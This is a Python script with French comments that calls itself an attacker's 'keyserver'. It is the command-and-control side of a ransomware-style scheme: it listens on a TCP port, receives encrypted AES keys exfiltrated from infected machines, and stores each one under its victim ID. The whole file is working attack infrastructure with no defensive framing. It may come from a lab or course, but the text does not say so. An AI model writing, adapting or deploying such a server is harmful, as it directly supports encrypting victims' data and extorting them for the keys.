#!/usr/bin/env python3
"""
keyserver.py — Écoute et reçoit les clés AES chiffrées exfiltrées (ATTAQUANT)
Usage: python3 keyserver.py [port]   (défaut: 9999)
"""

import socket
import json
import sys
import os

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9999
KEYS_DIR = "received_keys"
os.makedirs(KEYS_DIR, exist_ok=True)

print(f"[*] Keyserver en écoute sur 0.0.0.0:{PORT}")
print(f"[*] Clés sauvegardées dans ./{KEYS_DIR}/\n")

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", PORT))
s.listen(10)

while True:
    try:
        conn, addr = s.accept()
        data = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        conn.close()

        payload = json.loads(data.decode().strip())
        victim_id = payload["victim_id"]
        enc_key_hex = payload["encrypted_aes_key"]

        # Sauvegarde
        key_file = os.path.join(KEYS_DIR, f"{victim_id}.hex")
        with open(key_file, "w") as f:
            f.write(enc_key_hex)

        print(f"[+] Clé reçue de {addr[0]}")
        print(f"    Victim ID : {victim_id}")
        print(f"    Sauvée    : {key_file}\n")

    except KeyboardInterrupt:
        print("\n[*] Arrêt du keyserver")
        break
    except Exception as e:
        print(f"[!] Erreur : {e}")
